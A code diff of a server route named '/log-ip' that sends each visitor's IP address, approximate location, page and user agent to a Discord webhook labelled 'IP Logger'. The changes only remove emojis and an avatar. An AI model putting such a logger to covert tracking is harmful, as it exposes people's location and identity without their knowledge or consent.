@@ -18,31 +18,31 @@ app.post('/log-ip', async (req, res) => {
         
         // Create Discord embed message
         const embed = {
-            title: "📡 New IP Logged",
+            title: "New IP Logged",
             color: 0x5865F2, // Discord blurple
             fields: [
                 {
-                    name: "🌐 IP Address",
+                    name: "IP Address",
                     value: `\`${ip}\``,
                     inline: true
                 },
                 {
-                    name: "📍 Location",
+                    name: "Location",
                     value: `${city}, ${region}, ${country}`,
                     inline: true
                 },
                 {
-                    name: "🕐 Timestamp",
+                    name: "Timestamp",
                     value: new Date(timestamp).toLocaleString(),
                     inline: true
                 },
                 {
-                    name: "🔗 Page",
+                    name: "Page",
                     value: page || 'Unknown',
                     inline: false
                 },
                 {
-                    name: "🖥️ User Agent",
+                    name: "User Agent",
                     value: `\`\`\`${userAgent.substring(0, 1000)}\`\`\``,
                     inline: false
                 }
@@ -56,8 +56,7 @@ app.post('/log-ip', async (req, res) => {
         // Send to Discord webhook
         await axios.post(DISCORD_WEBHOOK_URL, {
             embeds: [embed],
-            username: "IP Logger",
-            avatar_url: "https://cdn-icons-png.flaticon.com/512/484/484167.png"
+            username: "ip logger",
         });
 
         res.json({ success: true, message: "Logged successfully" });
